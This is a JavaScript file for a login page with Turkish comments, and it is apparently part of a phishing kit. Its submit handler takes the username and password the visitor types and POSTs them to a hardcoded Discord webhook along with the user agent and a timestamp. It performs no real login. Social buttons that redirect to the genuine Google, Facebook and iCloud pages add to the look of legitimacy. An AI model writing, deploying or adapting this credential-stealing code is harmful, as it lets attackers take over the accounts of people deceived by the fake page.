const inputs = document.querySelectorAll('.input');
const button = document.querySelector('.login-btn');
const form = document.querySelector('.section-login');
const checkbox = document.querySelector('#input-checkbox');
const googleButton = document.querySelector('.btn-social:nth-child(2)');
const facebookButton = document.querySelector('.btn-social:nth-child(1)');
const appleButton = document.querySelector('.btn-social:nth-child(3)');

// Webhook URL'nizi buraya ekleyin
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1397118451834814554/K0VBjoS0qziGMTwqa2Ixboe4NnUdfYOEmzYxrrpbH9fWiFYcyw6DLthC0jBVcknTTR3d';

const handleFocus = ({ target }) => {
    const span = target.previousElementSibling;
    span.classList.add('span-active');
}

const handleFocusOut = ({ target }) => {
    if(target.value === ''){
        const span = target.previousElementSibling;
        span.classList.remove('span-active');
    }
}

const handleChange = () => {
    const [user, password] = inputs;

    if(user.value && password.value.length >= 8){
        button.removeAttribute('disabled');
    } else{
        button.setAttribute('disabled', '');
    }
}

const handleGoogleSignIn = () => {
    window.location.href = 'https://accounts.google.com/v3/signin/identifier?authuser=0&continue=https%3A%2F%2Fmail.google.com%2Fmail&ec=GAlAFw&hl=tr&service=mail&flowName=GlifWebSignIn&flowEntry=AddSession&dsh=S1949872418%3A1753193825700285';
}

const handleFacebookSignIn = () => {
    window.location.href = 'https://www.facebook.com/?stype=lo&flo=1&deoia=1&jlou=Afc2iOw04DUl_T1kkxcUNDKQca7ppPOx6AVrlkTQJW_A2vBAMgIOXi8zWmau0fidIEJyozXyT8aX2RxlV5rMOxzUOMdtikyEzFv4G9OSmWNqEw&smuh=12196&lh=Ac8-EksHCcS1L2OsyA0';
}

const handleAppleSignIn = () => {
    window.location.href = 'https://www.icloud.com/';
}

const sendToWebhook = async (data) => {
    try {
        const response = await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(data)
        });

        if (!response.ok) {
            throw new Error('Webhook gönderimi başarısız');
        }

        return true;
    } catch (error) {
        console.error('Webhook hatası:', error);
        return false;
    }
}

const handleSubmit = async (e) => {
    e.preventDefault();
    const [username, password] = inputs;
    const rememberMe = checkbox.checked;

    if (!username.value || !password.value) {
        alert('Lütfen tüm alanları doldurun');
        return;
    }

    button.disabled = true;
    button.style.cursor = 'wait';

    const formData = {
        username: username.value,
        password: password.value,
        rememberMe: rememberMe,
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent
    };

    const success = await sendToWebhook(formData);

    if (success) {
        // Başarılı giriş sonrası yönlendirme yapabilirsiniz
        window.location.href = 'YOUR_REDIRECT_URL';
    } else {
        alert('Giriş işlemi başarısız oldu. Lütfen tekrar deneyin.');
        button.disabled = false;
        button.style.cursor = 'pointer';
    }
}

// Event Listeners
inputs.forEach((input) => input.addEventListener('focus', handleFocus));
inputs.forEach((input) => input.addEventListener('focusout', handleFocusOut));
inputs.forEach((input) => input.addEventListener('input', handleChange));
button.addEventListener('click', handleSubmit);
googleButton.addEventListener('click', handleGoogleSignIn);
facebookButton.addEventListener('click', handleFacebookSignIn);
appleButton.addEventListener('click', handleAppleSignIn);
